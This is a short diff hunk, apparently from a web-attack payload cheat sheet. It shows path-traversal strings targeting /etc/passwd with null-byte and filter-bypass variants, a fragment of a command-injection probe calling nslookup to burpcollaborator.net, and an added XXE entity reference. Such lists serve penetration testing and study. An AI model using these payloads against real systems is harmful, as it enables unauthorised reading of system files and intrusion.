@@ -54,4 +54,6 @@ nslookup+burpcollaborator.net
 /var/www/images/../../../etc/passwd%00
 /var/www/images/..//..//..//..//etc/passwd%00
 /var/www/images/....//....//....//....//etc/passwd%00
+# XXE
+&xxe;
 ```
